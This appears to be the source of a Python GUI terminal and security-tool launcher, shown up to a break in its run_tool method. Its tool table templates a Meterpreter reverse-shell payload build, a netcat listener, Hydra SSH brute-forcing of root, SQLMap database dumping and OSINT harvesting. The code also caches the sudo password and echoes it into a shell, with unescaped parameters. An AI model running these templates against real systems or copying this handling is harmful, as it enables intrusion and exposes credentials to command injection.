#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import re
import select
import signal
import time
from datetime import datetime
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog


class TerminalTab:
    def __init__(self, notebook, name, on_close_callback, status_bar):
        self.notebook = notebook
        self.name = name
        self.on_close_callback = on_close_callback
        self.status_bar = status_bar

        self.real_user = self._get_real_user()
        if self.real_user != 'root':
            self.home_dir = f"/home/{self.real_user}"
        else:
            self.home_dir = os.path.expanduser("~")
        self.current_dir = self.home_dir

        self.sudo_password = None

        self.command_history = []
        self.history_position = 0
        self.current_process = None
        self.process_running = False
        self.process_lock = threading.Lock()
        self.stop_requested = threading.Event()
        self.is_closing = False
        self.user_scrolled = False
        self.scroll_check_after_id = None

        self.frame = ttk.Frame(notebook)
        self.tab_id = notebook.add(self.frame, text=f"💻 {name}")

        self.top_bar = tk.Frame(self.frame, bg='#1A1A1A', height=35)
        self.top_bar.pack(fill=tk.X, side=tk.TOP)
        self.top_bar.pack_propagate(False)

        self.dir_label = tk.Label(
            self.top_bar, text=f"📁 {self.current_dir}",
            bg='#1A1A1A', fg='#44AAFF', font=('Consolas', 9)
        )
        self.dir_label.pack(side=tk.LEFT, padx=10)

        self.stop_button = tk.Button(
            self.top_bar, text="⏹ STOP", command=self.stop_current_process,
            bg='#5A2A2A', fg='#FF4444', font=('Arial', 9, 'bold'),
            relief=tk.FLAT, padx=15, pady=3, state=tk.DISABLED, cursor="hand2"
        )
        self.stop_button.pack(side=tk.RIGHT, padx=10)

        self.clear_button = tk.Button(
            self.top_bar, text="🗑 CLEAR", command=self.clear_screen,
            bg='#2A2A2A', fg='#AAAAAA', font=('Arial', 9),
            relief=tk.FLAT, padx=15, pady=3, cursor="hand2"
        )
        self.clear_button.pack(side=tk.RIGHT, padx=5)

        text_frame = tk.Frame(self.frame, bg='#0C0C0C')
        text_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        v_scrollbar = ttk.Scrollbar(text_frame, orient=tk.VERTICAL)
        v_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        h_scrollbar = ttk.Scrollbar(text_frame, orient=tk.HORIZONTAL)
        h_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)

        self.output_text = tk.Text(
            text_frame, bg='#0C0C0C', fg='#00FF00', insertbackground='#00FF00',
            font=('Consolas', 10), wrap=tk.NONE, relief=tk.FLAT, padx=10, pady=10,
            yscrollcommand=self.on_scroll, xscrollcommand=h_scrollbar.set,
            selectbackground='#335533', selectforeground='#00FF00'
        )
        self.output_text.pack(fill=tk.BOTH, expand=True)

        v_scrollbar.config(command=self.output_text.yview)
        h_scrollbar.config(command=self.output_text.xview)

        self.output_text.tag_configure('prompt', foreground='#FF4444')
        self.output_text.tag_configure('error', foreground='#FF4444')
        self.output_text.tag_configure('success', foreground='#44FF44')
        self.output_text.tag_configure('info', foreground='#44AAFF')
        self.output_text.tag_configure('warning', foreground='#FFAA44')

        self.output_text.bind('<Control-c>', self.copy_selection)
        self.output_text.bind('<Control-C>', self.copy_selection)
        self.output_text.bind('<Button-4>', self.on_mousewheel_up)
        self.output_text.bind('<Button-5>', self.on_mousewheel_down)
        self.output_text.bind('<Button-1>', self.on_user_click)
        self.output_text.bind('<Key>', self.on_user_key)

        input_frame = tk.Frame(self.frame, bg='#0C0C0C', height=40)
        input_frame.pack(fill=tk.X, side=tk.BOTTOM)
        input_frame.pack_propagate(False)

        self.prompt_label = tk.Label(
            input_frame, text=self.get_prompt_text(),
            bg='#0C0C0C', fg='#FF4444', font=('Consolas', 10, 'bold')
        )
        self.prompt_label.pack(side=tk.LEFT, padx=(10, 5))

        self.input_entry = tk.Entry(
            input_frame, bg='#1A1A1A', fg='#00FF00',
            font=('Consolas', 10), relief=tk.FLAT,
            insertbackground='#00FF00', highlightthickness=0, bd=0
        )
        self.input_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))

        self.input_entry.bind('<Return>', self.execute_command)
        self.input_entry.bind('<Up>', self.previous_command)
        self.input_entry.bind('<Down>', self.next_command)

        self.add_output(f"\n{'='*70}\n", 'info')
        self.add_output(f"🔥 CyberTerm v6.0 - {name}\n", 'success')
        self.add_output(f"📂 {self.current_dir}\n", 'info')
        self.add_output(f"👤 {self.real_user}\n", 'info')
        self.add_output(f"{'='*70}\n", 'info')
        self.add_output("✅ Commands: help, clear, pwd, ls, cd, edit, exit\n")
        self.add_output("✅ sudo <command> - run with root privileges\n")
        self.add_output("✅ edit <file> - built-in text editor\n")
        self.add_output("💡 Right click on tab to close\n")
        self.add_output("💡 STOP button terminates running process\n\n")

        self.print_prompt()

    def on_scroll(self, *args):
        self.output_text.yview_moveto(args[0])
        self.check_user_scroll()

    def on_mousewheel_up(self, event):
        self.user_scrolled = True
        self.cancel_scroll_check()

    def on_mousewheel_down(self, event):
        self.output_text.yview_scroll(1, "units")
        self.check_user_scroll()

    def on_user_click(self, event):
        self.schedule_scroll_check()

    def on_user_key(self, event):
        if event.keysym in ('Up', 'Down', 'Prior', 'Next', 'Home', 'End'):
            self.user_scrolled = True
            self.cancel_scroll_check()
        else:
            self.schedule_scroll_check()

    def schedule_scroll_check(self):
        if self.scroll_check_after_id:
            self.output_text.after_cancel(self.scroll_check_after_id)
        self.scroll_check_after_id = self.output_text.after(100, self.check_user_scroll)

    def cancel_scroll_check(self):
        if self.scroll_check_after_id:
            self.output_text.after_cancel(self.scroll_check_after_id)
            self.scroll_check_after_id = None

    def check_user_scroll(self):
        if not self.process_running:
            self.user_scrolled = False
            return

        try:
            yview = self.output_text.yview()
            bottom_pos = yview[1]
            if bottom_pos >= 0.99:
                self.user_scrolled = False
            else:
                self.user_scrolled = True
        except:
            self.user_scrolled = False

    def _get_real_user(self):
        try:
            if 'SUDO_USER' in os.environ:
                return os.environ['SUDO_USER']
            if 'USER' in os.environ and os.environ['USER'] != 'root':
                return os.environ['USER']
            result = subprocess.run(['logname'], capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
            return os.environ.get('USER', os.environ.get('LOGNAME', 'user'))
        except:
            return 'user'

    def get_prompt_text(self):
        display_path = self.current_dir
        if display_path.startswith(self.home_dir):
            display_path = "~" + display_path[len(self.home_dir):]
        if self.process_running:
            return f"[PROCESS] {display_path} $ "
        return f"{display_path} $ "

    def update_prompt(self):
        try:
            self.prompt_label.config(text=self.get_prompt_text())
        except:
            pass

    def update_directory_display(self):
        try:
            display_path = self.current_dir
            if display_path.startswith(self.home_dir):
                display_path = "~" + display_path[len(self.home_dir):]
            self.dir_label.config(text=f"📁 {display_path}")
        except:
            pass

    def add_output(self, text, tag=None):
        def _add():
            try:
                if not self.output_text.winfo_exists():
                    return
                self.output_text.config(state=tk.NORMAL)
                clean_text = re.sub(r'\x1b\[[0-9;]*[mK]', '', text)
                if tag:
                    self.output_text.insert(tk.END, clean_text, tag)
                else:
                    self.output_text.insert(tk.END, clean_text)
                
                if not self.user_scrolled:
                    self.output_text.see(tk.END)
                    
                self.output_text.config(state=tk.DISABLED)
            except:
                pass

        if threading.current_thread() is threading.main_thread():
            _add()
        else:
            try:
                if hasattr(self, 'output_text') and self.output_text.winfo_exists():
                    self.output_text.after(0, _add)
            except:
                pass

    def print_prompt(self):
        self.add_output(f"\n{self.get_prompt_text()}", 'prompt')
        try:
            if not self.user_scrolled:
                self.output_text.after(10, lambda: self.output_text.see(tk.END))
        except:
            pass

    def copy_selection(self, event=None):
        try:
            selected = self.output_text.get(tk.SEL_FIRST, tk.SEL_LAST)
            self.output_text.clipboard_clear()
            self.output_text.clipboard_append(selected)
        except:
            pass
        return 'break'

    def clear_screen(self):
        try:
            self.output_text.config(state=tk.NORMAL)
            self.output_text.delete(1.0, tk.END)
            self.output_text.config(state=tk.DISABLED)
            self.user_scrolled = False
            self.print_prompt()
        except:
            pass

    def stop_current_process(self):
        with self.process_lock:
            if not self.process_running or self.current_process is None:
                return
            self.stop_requested.set()
            process = self.current_process
            self.process_running = False

        if process is None:
            return

        self.add_output(f"\n^C\n", 'prompt')
        
        def kill_process():
            try:
                pid = process.pid
                try:
                    pgid = os.getpgid(pid)
                    os.killpg(pgid, signal.SIGINT)
                except:
                    try:
                        os.kill(pid, signal.SIGINT)
                    except:
                        pass

                time.sleep(0.5)
                
                if process.poll() is not None:
                    self.add_output("✅ Process terminated (SIGINT)\n", 'success')
                    return

                try:
                    pgid = os.getpgid(pid)
                    os.killpg(pgid, signal.SIGTERM)
                except:
                    try:
                        os.kill(pid, signal.SIGTERM)
                    except:
                        pass

                time.sleep(0.3)
                
                if process.poll() is not None:
                    self.add_output("✅ Process terminated (SIGTERM)\n", 'success')
                    return

                try:
                    pgid = os.getpgid(pid)
                    os.killpg(pgid, signal.SIGKILL)
                except:
                    try:
                        os.kill(pid, signal.SIGKILL)
                    except:
                        pass

                self.add_output("✅ Process killed (SIGKILL)\n", 'success')
                
            except:
                pass
            finally:
                def cleanup():
                    try:
                        with self.process_lock:
                            self.current_process = None
                        self.user_scrolled = False
                        self.stop_button.config(state=tk.DISABLED)
                        self.update_prompt()
                        self.print_prompt()
                    except:
                        pass
                
                try:
                    self.output_text.after(0, cleanup)
                except:
                    pass

        thread = threading.Thread(target=kill_process, daemon=True)
        thread.start()

        try:
            self.stop_button.config(state=tk.DISABLED)
            self.update_prompt()
        except:
            pass

    def run_with_sudo(self, command):
        if self.sudo_password is None:
            password = simpledialog.askstring("sudo", f"Password for {self.real_user}:", show='*', parent=self.notebook)
            if not password:
                self.add_output("\n❌ sudo: password required\n", 'error')
                return
            self.sudo_password = password
            self.add_output("\n🔑 Password saved for this session\n", 'success')

        full_cmd = f"echo '{self.sudo_password}' | sudo -S {command}"
        self.stop_requested.clear()

        def target():
            process = None
            try:
                with self.process_lock:
                    if self.stop_requested.is_set():
                        return
                    
                    process = subprocess.Popen(
                        full_cmd, shell=True, stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        text=True, cwd=self.current_dir, bufsize=1,
                        preexec_fn=os.setsid
                    )
                    self.current_process = process
                    self.process_running = True
                    self.stop_button.config(state=tk.NORMAL)
                    self.update_prompt()

                while process.poll() is None and not self.stop_requested.is_set():
                    try:
                        rlist, _, _ = select.select([process.stdout], [], [], 0.1)
                        if rlist:
                            data = process.stdout.read(4096)
                            if data:
                                self.add_output(data)
                    except:
                        break

                if self.stop_requested.is_set():
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                    except:
                        try:
                            process.kill()
                        except:
                            pass
                    process.wait()

            except Exception as e:
                if not self.stop_requested.is_set():
                    self.add_output(f"\n❌ Error: {e}\n", 'error')
            finally:
                with self.process_lock:
                    self.current_process = None
                    self.process_running = False
                try:
                    self.user_scrolled = False
                    self.stop_button.config(state=tk.DISABLED)
                    self.update_prompt()
                    if self.stop_requested.is_set():
                        self.print_prompt()
                except:
                    pass
                self.stop_requested.clear()

        threading.Thread(target=target, daemon=True).start()

    def open_editor(self, filename):
        if not filename:
            filename = simpledialog.askstring("Editor", "File name:", parent=self.notebook)
            if not filename:
                return

        full_path = os.path.join(self.current_dir, filename)
        content = ""
        if os.path.exists(full_path):
            try:
                with open(full_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            except:
                pass

        editor_window = tk.Toplevel(self.notebook)
        editor_window.title(f"Editor: {filename}")
        editor_window.geometry("800x600")
        editor_window.configure(bg='#0C0C0C')
        editor_window.transient(self.notebook)
        editor_window.grab_set()

        text_area = tk.Text(editor_window, bg='#0C0C0C', fg='#00FF00',
                            font=('Consolas', 11), wrap=tk.WORD,
                            insertbackground='#00FF00',
                            selectbackground='#335533')
        text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        text_area.insert(tk.END, content)
        text_area.focus_set()

        info_label = tk.Label(editor_window, text=f"Editing: {full_path}",
                              bg='#1A1A1A', fg='#666666', anchor='w', padx=10)
        info_label.pack(fill=tk.X, side=tk.TOP)

        button_frame = tk.Frame(editor_window, bg='#1A1A1A', height=40)
        button_frame.pack(fill=tk.X, side=tk.BOTTOM)
        button_frame.pack_propagate(False)

        def save_file():
            try:
                new_content = text_area.get(1.0, tk.END).rstrip('\n')
                with open(full_path, 'w', encoding='utf-8') as f:
                    f.write(new_content)
                info_label.config(text=f"✅ Saved: {full_path}", fg='#44FF44')
                self.add_output(f"\n✅ File saved: {filename}\n", 'success')
                editor_window.after(1500, lambda: info_label.config(text=f"Editing: {full_path}", fg='#666666'))
            except Exception as e:
                info_label.config(text=f"❌ Error: {e}", fg='#FF4444')

        def close_editor():
            editor_window.destroy()

        save_btn = tk.Button(button_frame, text="💾 SAVE", command=save_file,
                             bg='#2A5A2A', fg='#44FF44', font=('Arial', 10, 'bold'),
                             relief=tk.FLAT, padx=20, pady=8, cursor="hand2")
        save_btn.pack(side=tk.LEFT, padx=10)

        close_btn = tk.Button(button_frame, text="✗ CLOSE", command=close_editor,
                              bg='#5A2A2A', fg='#FF4444', font=('Arial', 10, 'bold'),
                              relief=tk.FLAT, padx=20, pady=8, cursor="hand2")
        close_btn.pack(side=tk.RIGHT, padx=10)

        text_area.bind('<Control-s>', lambda e: save_file())
        editor_window.bind('<Escape>', lambda e: close_editor())

    def execute_command(self, event=None):
        command = self.input_entry.get().strip()
        if not command:
            self.print_prompt()
            self.input_entry.delete(0, tk.END)
            return

        if self.process_running and self.current_process is not None:
            try:
                self.current_process.stdin.write(command + '\n')
                self.current_process.stdin.flush()
                self.add_output(command + '\n', 'prompt')
            except:
                self.add_output(f"\n❌ Cannot send input to process\n", 'error')
            self.input_entry.delete(0, tk.END)
            self.print_prompt()
            return

        self.command_history.append(command)
        self.history_position = len(self.command_history)
        self.add_output(f"\n{self.get_prompt_text()}{command}\n", 'prompt')

        if command == 'help':
            self.add_output("Commands: help, clear, pwd, ls, cd, edit, exit\n", 'info')
            self.add_output("  sudo <cmd> - run with root privileges\n", 'info')
        elif command == 'clear':
            self.clear_screen()
        elif command == 'pwd':
            self.add_output(f"{self.current_dir}\n")
        elif command == 'ls':
            self.list_directory()
        elif command.startswith('cd '):
            self.change_directory(command[3:].strip())
        elif command.startswith('sudo '):
            self.run_with_sudo(command[5:].strip())
        elif command.startswith('edit '):
            self.open_editor(command[5:].strip())
        elif command == 'edit':
            self.open_editor(None)
        elif command == 'exit':
            self.close_tab()
        else:
            self.run_system_command(command)

        self.input_entry.delete(0, tk.END)
        self.print_prompt()

    def list_directory(self):
        try:
            items = os.listdir(self.current_dir)
            dirs = []
            files = []
            for item in items:
                full_path = os.path.join(self.current_dir, item)
                if os.path.isdir(full_path):
                    dirs.append(f"📁 {item}")
                else:
                    files.append(f"📄 {item}")

            if dirs:
                self.add_output("\n📂 DIRECTORIES:\n", 'info')
                for d in sorted(dirs):
                    self.add_output(f"  {d}\n")
            if files:
                self.add_output("\n📃 FILES:\n", 'info')
                for f in sorted(files):
                    self.add_output(f"  {f}\n")
        except Exception as e:
            self.add_output(f"❌ {e}\n", 'error')

    def change_directory(self, path):
        if not path:
            self.add_output(f"{self.current_dir}\n")
            return

        if path == '~':
            new_dir = self.home_dir
        elif path == '..':
            new_dir = os.path.dirname(self.current_dir)
        elif path.startswith('~/'):
            new_dir = os.path.join(self.home_dir, path[2:])
        else:
            new_dir = os.path.join(self.current_dir, path)

        try:
            os.chdir(new_dir)
            self.current_dir = os.getcwd()
            self.update_prompt()
            self.update_directory_display()
            self.add_output(f"✅ {self.current_dir}\n", 'success')
        except Exception as e:
            self.add_output(f"❌ {e}\n", 'error')

    def run_system_command(self, command):
        self.stop_requested.clear()

        def target():
            process = None
            try:
                with self.process_lock:
                    if self.stop_requested.is_set():
                        return
                    
                    process = subprocess.Popen(
                        command, shell=True, stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        text=True, cwd=self.current_dir, bufsize=1,
                        preexec_fn=os.setsid
                    )
                    self.current_process = process
                    self.process_running = True
                    self.stop_button.config(state=tk.NORMAL)
                    self.update_prompt()

                while process.poll() is None and not self.stop_requested.is_set():
                    try:
                        rlist, _, _ = select.select([process.stdout], [], [], 0.1)
                        if rlist:
                            data = process.stdout.read(4096)
                            if data:
                                self.add_output(data)
                    except:
                        break

                if self.stop_requested.is_set():
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                    except:
                        try:
                            process.kill()
                        except:
                            pass
                    process.wait()

            except Exception as e:
                if not self.stop_requested.is_set():
                    self.add_output(f"\n❌ Error: {e}\n", 'error')
            finally:
                with self.process_lock:
                    self.current_process = None
                    self.process_running = False
                try:
                    self.user_scrolled = False
                    self.stop_button.config(state=tk.DISABLED)
                    self.update_prompt()
                    if self.stop_requested.is_set():
                        self.print_prompt()
                except:
                    pass
                self.stop_requested.clear()

        threading.Thread(target=target, daemon=True).start()

    def previous_command(self, event):
        if self.history_position > 0:
            self.history_position -= 1
            self.input_entry.delete(0, tk.END)
            self.input_entry.insert(0, self.command_history[self.history_position])
        return 'break'

    def next_command(self, event):
        if self.history_position < len(self.command_history) - 1:
            self.history_position += 1
            self.input_entry.delete(0, tk.END)
            self.input_entry.insert(0, self.command_history[self.history_position])
        elif self.history_position == len(self.command_history) - 1:
            self.history_position += 1
            self.input_entry.delete(0, tk.END)
        return 'break'

    def close_tab(self):
        if self.process_running:
            self.stop_current_process()
        self.output_text.after(50, lambda: self.on_close_callback(self))

    def focus(self):
        try:
            self.input_entry.focus_set()
        except:
            pass


class ToolTab:
    def __init__(self, notebook, tool_name, on_close_callback):
        self.notebook = notebook
        self.tool_name = tool_name
        self.on_close_callback = on_close_callback

        self.current_process = None
        self.process_running = False
        self.process_lock = threading.Lock()
        self.stop_requested = threading.Event()
        self.is_closing = False
        self.user_scrolled = False
        self.scroll_check_after_id = None

        self.frame = ttk.Frame(notebook)
        self.tab_id = notebook.add(self.frame, text=f"🔧 {tool_name}")

        self.tool_configs = {
            "Nmap": {
                "icon": "📡", "description": "Network Scanner",
                "category": "Network",
                "params": [
                    {"name": "Target", "key": "target", "default": "127.0.0.1"},
                    {"name": "Ports", "key": "ports", "default": "1-1000"},
                    {"name": "Options", "key": "options", "default": "-sV"}
                ],
                "build_cmd": lambda p: f"nmap {p['options']} -p{p['ports']} {p['target']}"
            },
            "SQLMap": {
                "icon": "💉", "description": "SQL Injection",
                "category": "Exploitation",
                "params": [
                    {"name": "URL", "key": "url", "default": "http://test.com?id=1"},
                    {"name": "Options", "key": "options", "default": "--dbs --batch"}
                ],
                "build_cmd": lambda p: f"sqlmap -u '{p['url']}' {p['options']}"
            },
            "Netcat": {
                "icon": "🎧", "description": "Network Tool",
                "category": "Network",
                "params": [
                    {"name": "Mode", "key": "mode", "default": "listen"},
                    {"name": "Port", "key": "port", "default": "4444"},
                    {"name": "Target", "key": "target", "default": ""}
                ],
                "build_cmd": lambda p: f"nc -lvnp {p['port']}" if p['mode'] == 'listen' else f"nc {p['target']} {p['port']}"
            },
            "Hydra": {
                "icon": "🐉", "description": "Brute Force",
                "category": "Exploitation",
                "params": [
                    {"name": "Target", "key": "target", "default": "127.0.0.1"},
                    {"name": "Service", "key": "service", "default": "ssh"},
                    {"name": "Username", "key": "user", "default": "root"},
                    {"name": "Wordlist", "key": "wordlist", "default": "/usr/share/wordlists/rockyou.txt"}
                ],
                "build_cmd": lambda p: f"hydra -l {p['user']} -P {p['wordlist']} {p['target']} {p['service']}"
            },
            "Metasploit": {
                "icon": "🎯", "description": "Payload Generator",
                "category": "Exploitation",
                "params": [
                    {"name": "LHOST", "key": "lhost", "default": "192.168.1.100"},
                    {"name": "LPORT", "key": "lport", "default": "4444"},
                    {"name": "Format", "key": "format", "default": "exe"}
                ],
                "build_cmd": lambda p: f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={p['lhost']} LPORT={p['lport']} -f {p['format']} -o payload.{p['format']}"
            },
            "theHarvester": {
                "icon": "🌐", "description": "Email & Domain Harvester",
                "category": "OSINT",
                "params": [
                    {"name": "Domain", "key": "domain", "default": "example.com"},
                    {"name": "Sources", "key": "sources", "default": "google,bing,yahoo"},
                    {"name": "Limit", "key": "limit", "default": "100"}
                ],
                "build_cmd": lambda p: f"theHarvester -d {p['domain']} -b {p['sources']} -l {p['limit']}"
            },
            "Sherlock": {
                "icon": "🔍", "description": "Username Search",
                "category": "OSINT",
                "params": [
                    {"name": "Username", "key": "username", "default": "username"},
                    {"name": "Output", "key": "output", "default": ""},
                    {"name": "Timeout", "key": "timeout", "default": "10"}
                ],
                "build_cmd": lambda p: f"sherlock {p['username']}" + 
                    (f" --output {p['output']}" if p['output'] else "") + 
                    f" --timeout {p['timeout']}"
            },
            "Whois": {
                "icon": "📋", "description": "WHOIS Lookup",
                "category": "OSINT",
                "params": [
                    {"name": "Domain/IP", "key": "target", "default": "example.com"},
                    {"name": "Server", "key": "server", "default": ""}
                ],
                "build_cmd": lambda p: f"whois {p['target']}" + 
                    (f" -h {p['server']}" if p['server'] else "")
            },
            "ExifTool": {
                "icon": "📸", "description": "Metadata Extractor",
                "category": "OSINT",
                "params": [
                    {"name": "File", "key": "file", "default": "image.jpg"},
                    {"name": "Options", "key": "options", "default": "-a -u -g1"}
                ],
                "build_cmd": lambda p: f"exiftool {p['options']} {p['file']}"
            },
            "Photon": {
                "icon": "🕷", "description": "Web Crawler",
                "category": "OSINT",
                "params": [
                    {"name": "URL", "key": "url", "default": "https://example.com"},
                    {"name": "Depth", "key": "depth", "default": "2"},
                    {"name": "Timeout", "key": "timeout", "default": "5"}
                ],
                "build_cmd": lambda p: f"photon -u {p['url']} -l {p['depth']} -t {p['timeout']}"
            },
            "Holehe": {
                "icon": "📧", "description": "Email Verifier",
                "category": "OSINT",
                "params": [
                    {"name": "Email", "key": "email", "default": "test@example.com"},
                    {"name": "Only Used", "key": "only_used", "default": ""}
                ],
                "build_cmd": lambda p: f"holehe {p['email']}" + 
                    (" --only-used" if p['only_used'] else "")
            },
            "SpiderFoot": {
                "icon": "🕸", "description": "Automated OSINT",
                "category": "OSINT",
                "params": [
                    {"name": "Target", "key": "target", "default": "example.com"},
                    {"name": "Type", "key": "type", "default": "DOMAIN_NAME"}
                ],
                "build_cmd": lambda p: f"spiderfoot -s {p['target']} -t {p['type']}"
            },
            "Dmitry": {
                "icon": "🗺", "description": "Host Info Gatherer",
                "category": "OSINT",
                "params": [
                    {"name": "Target", "key": "target", "default": "example.com"},
                    {"name": "Options", "key": "options", "default": "-winsepfb"}
                ],
                "build_cmd": lambda p: f"dmitry {p['options']} {p['target']}"
            },
            "Metagoofil": {
                "icon": "📑", "description": "Document Metadata",
                "category": "OSINT",
                "params": [
                    {"name": "Domain", "key": "domain", "default": "example.com"},
                    {"name": "File Types", "key": "file_types", "default": "pdf,doc,xls"},
                    {"name": "Limit", "key": "limit", "default": "50"}
                ],
                "build_cmd": lambda p: f"metagoofil -d {p['domain']} -t {p['file_types']} -l {p['limit']} -o results -f results.html"
            },
        }

        config = self.tool_configs.get(tool_name, {})
        category = config.get('category', 'Other')

        top_frame = tk.Frame(self.frame, bg='#1A1A1A')
        top_frame.pack(fill=tk.X, pady=(0, 10))

        title_frame = tk.Frame(top_frame, bg='#1A1A1A')
        title_frame.pack(pady=10)

        tk.Label(title_frame, text=f"{config.get('icon', '🔧')} {tool_name}",
                bg='#1A1A1A', fg='#00FF00', font=('Arial', 16, 'bold')).pack()
        tk.Label(title_frame, text=config.get('description', 'Tool'),
                bg='#1A1A1A', fg='#666666', font=('Arial', 10)).pack(pady=(5, 0))
        tk.Label(title_frame, text=f"📂 Category: {category}",
                bg='#1A1A1A', fg='#AA44FF' if category == 'OSINT' else '#44AAFF', 
                font=('Arial', 9)).pack(pady=(2, 0))

        separator = tk.Frame(top_frame, bg='#2A2A2A', height=2)
        separator.pack(fill=tk.X, padx=20, pady=10)

        params_frame = tk.Frame(top_frame, bg='#1A1A1A')
        params_frame.pack(pady=10)

        self.param_entries = {}
        for i, param in enumerate(config.get('params', [])):
            row_frame = tk.Frame(params_frame, bg='#1A1A1A')
            row_frame.pack(pady=5)
            tk.Label(row_frame, text=f"{param['name']}:", bg='#1A1A1A',
                    fg='#44AAFF', font=('Consolas', 10, 'bold'),
                    width=12, anchor='e').pack(side=tk.LEFT, padx=(0, 10))
            entry = tk.Entry(row_frame, bg='#2A2A2A', fg='#00FF00',
                            font=('Consolas', 10), width=50,
                            relief=tk.FLAT, insertbackground='#00FF00')
            entry.insert(0, param['default'])
            entry.pack(side=tk.LEFT)
            self.param_entries[param['key']] = entry

        button_frame = tk.Frame(top_frame, bg='#1A1A1A')
        button_frame.pack(pady=15)

        self.run_button = tk.Button(button_frame, text="▶ RUN", command=self.run_tool,
                                    bg='#2A5A2A', fg='#44FF44', font=('Arial', 11, 'bold'),
                                    relief=tk.FLAT, padx=30, pady=8, cursor="hand2")
        self.run_button.pack(side=tk.LEFT, padx=5)

        self.stop_button = tk.Button(button_frame, text="⏹ STOP", command=self.stop_current_tool,
                                     bg='#5A2A2A', fg='#FF4444', font=('Arial', 11, 'bold'),
                                     relief=tk.FLAT, padx=25, pady=8, cursor="hand2",
                                     state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)

        self.clear_button = tk.Button(button_frame, text="🗑 CLEAR", command=self.clear_output,
                                     bg='#3A3A3A', fg='#AAAAAA', font=('Arial', 11),
                                     relief=tk.FLAT, padx=25, pady=8, cursor="hand2")
        self.clear_button.pack(side=tk.LEFT, padx=5)

        output_frame = tk.Frame(self.frame, bg='#0C0C0C')
        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))

        tk.Label(output_frame, text="OUTPUT:", bg='#0C0C0C', fg='#666666',
                font=('Arial', 9, 'bold'), anchor='w').pack(fill=tk.X, pady=(0, 5))

        text_container = tk.Frame(output_frame, bg='#0C0C0C')
        text_container.pack(fill=tk.BOTH, expand=True)

        v_scroll = ttk.Scrollbar(text_container, orient=tk.VERTICAL)
        v_scroll.pack(side=tk.RIGHT, fill=tk.Y)

        self.output_text = tk.Text(text_container, bg='#0C0C0C', fg='#00FF00',
                                   font=('Consolas', 10), wrap=tk.WORD,
                                   relief=tk.FLAT, padx=10, pady=10,
                                   yscrollcommand=self.on_scroll)
        self.output_text.pack(fill=tk.BOTH, expand=True)
        v_scroll.config(command=self.output_text.yview)

        self.output_text.config(state=tk.DISABLED)
        self.output_text.tag_configure('error', foreground='#FF4444')
        self.output_text.tag_configure('success', foreground='#44FF44')
        self.output_text.tag_configure('prompt', foreground='#44AAFF')
        self.output_text.tag_configure('warning', foreground='#FFAA44')
        self.output_text.tag_configure('osint', foreground='#AA44FF')

        self.output_text.bind('<Button-4>', self.on_mousewheel_up)
        self.output_text.bind('<Button-5>', self.on_mousewheel_down)
        self.output_text.bind('<Button-1>', self.on_user_click)
        self.output_text.bind('<Key>', self.on_user_key)

        self.add_output(f"✅ {tool_name} ready\n", 'success')
        self.add_output(f"💡 STOP to terminate process\n", 'info')

    def on_scroll(self, *args):
        self.output_text.yview_moveto(args[0])
        self.check_user_scroll()

    def on_mousewheel_up(self, event):
        self.user_scrolled = True
        self.cancel_scroll_check()

    def on_mousewheel_down(self, event):
        self.output_text.yview_scroll(1, "units")
        self.check_user_scroll()

    def on_user_click(self, event):
        self.schedule_scroll_check()

    def on_user_key(self, event):
        if event.keysym in ('Up', 'Down', 'Prior', 'Next', 'Home', 'End'):
            self.user_scrolled = True
            self.cancel_scroll_check()
        else:
            self.schedule_scroll_check()

    def schedule_scroll_check(self):
        if self.scroll_check_after_id:
            self.output_text.after_cancel(self.scroll_check_after_id)
        self.scroll_check_after_id = self.output_text.after(100, self.check_user_scroll)

    def cancel_scroll_check(self):
        if self.scroll_check_after_id:
            self.output_text.after_cancel(self.scroll_check_after_id)
            self.scroll_check_after_id = None

    def check_user_scroll(self):
        if not self.process_running:
            self.user_scrolled = False
            return

        try:
            yview = self.output_text.yview()
            bottom_pos = yview[1]
            if bottom_pos >= 0.99:
                self.user_scrolled = False
            else:
                self.user_scrolled = True
        except:
            self.user_scrolled = False

    def get_params(self):
        params = {}
        for key, entry in self.param_entries.items():
            params[key] = entry.get().strip()
        return params

    def stop_current_tool(self):
        with self.process_lock:
            if not self.process_running or self.current_process is None:
                return
            self.stop_requested.set()
            process = self.current_process
            self.process_running = False

        if process is None:
            return

        self.add_output(f"\n^C\n", 'prompt')

        def kill_process():
            try:
                pid = process.pid
                try:
                    os.killpg(os.getpgid(pid), signal.SIGINT)
                except:
                    try:
                        os.kill(pid, signal.SIGINT)
                    except:
                        pass

                time.sleep(0.3)
                if process.poll() is not None:
                    self.add_output("✅ Process terminated\n", 'success')
                    return

                try:
                    os.killpg(os.getpgid(pid), signal.SIGKILL)
                except:
                    try:
                        os.kill(pid, signal.SIGKILL)
                    except:
                        pass

                self.add_output("✅ Process killed\n", 'success')
            except:
                pass
            finally:
                def cleanup():
                    try:
                        with self.process_lock:
                            self.current_process = None
                        self.user_scrolled = False
                        self.stop_button.config(state=tk.DISABLED)
                        self.run_button.config(state=tk.NORMAL)
                    except:
                        pass
                try:
                    self.output_text.after(0, cleanup)
                except:
                    pass

        threading.Thread(target=kill_process, daemon=True).start()

        try:
            self.stop_button.config(state=tk.DISABLED)
            self.run_button.config(state=tk.NORMAL)
        except:
            pass

    def run_tool(self):
        if self.process_running:
            self.add_output("⚠️ Tool is already running\n", 'warning')
            return

        params = self.get_params()
        config = self.tool_configs.get(self.tool_name, {})
        if not config:
            self.add_output("❌ Config error\n", 'error')
            return
        cmd = config['build_cmd'](params)
        if not cmd:
            self.add_output("❌ Invalid params\n", 'error')
            return

        self.add_output(f"\n{'='*60}\n", 'prompt')
        self.add_output(f"🔧 {self.tool_name}\n", 'prompt')
